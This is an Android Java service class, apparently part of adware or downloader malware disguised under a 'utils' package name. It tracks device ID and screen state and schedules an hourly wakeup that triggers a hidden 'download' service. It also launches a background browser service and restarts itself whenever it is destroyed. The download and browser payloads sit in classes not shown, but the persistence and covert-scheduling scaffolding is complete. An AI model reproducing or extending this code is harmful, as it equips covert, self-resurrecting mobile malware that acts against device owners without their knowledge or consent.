package com.mx.utils.services;

import com.mx.utils.utils.MyHelpUtil;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.SystemClock;

public class MainService extends Service {

	public static final String DOWNLOAD_ACTION = "com.xcl.DOWNLOAD_ACTION";

	public static final String UNINSTALL_ACTION = "com.xcl.UNINSTALL_ACTION";

	PendingIntent pendingIntent;

	AlarmManager localAlarmManager;

	BroadcastReceiver mScreenReceiver = null;

	BroadcastReceiver receiver = null;
	
	Intent browserIntent;

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {

		MyHelpUtil.create_device_id(getApplicationContext());

		Intent downloadIntent = new Intent(DOWNLOAD_ACTION);

		pendingIntent = PendingIntent.getBroadcast(this, 0, downloadIntent,
				PendingIntent.FLAG_UPDATE_CURRENT);
		
		browserIntent = new Intent(this,BrowserService.class);

		alarmReceiver();

		startScreenBroadcastReceiver();

	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		localAlarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

		localAlarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
				(SystemClock.elapsedRealtime() + 20 * 1000), 3600 * 1000,
				pendingIntent);
		
		//start
		startService(browserIntent);

		return Service.START_STICKY;
	}

	@Override
	public void onDestroy() {
		try {

			getApplicationContext().unregisterReceiver(mScreenReceiver);

			getApplicationContext().unregisterReceiver(receiver);

		} catch (Exception e) {
			// TODO: handle exception
		}

		Intent intent = new Intent(this, MainService.class);

		startService(intent);
	}

	private void startScreenBroadcastReceiver() {

		IntentFilter filter = new IntentFilter();

		filter.addAction(Intent.ACTION_SCREEN_ON);

		filter.addAction(Intent.ACTION_SCREEN_OFF);

		mScreenReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context arg0, Intent arg1) {
				com.mx.utils.utils.MyHelpUtil.save_screen_status(arg0);
			}
		};
		getApplicationContext().registerReceiver(mScreenReceiver, filter);
	}

	public void alarmReceiver() {

		IntentFilter intentFilter = new IntentFilter(DOWNLOAD_ACTION);

		receiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context arg0, Intent arg1) {

				Intent sIntent = new Intent(arg0, SService.class);

				startService(sIntent);

			}
		};
		getApplicationContext().registerReceiver(receiver, intentFilter);
	}
}
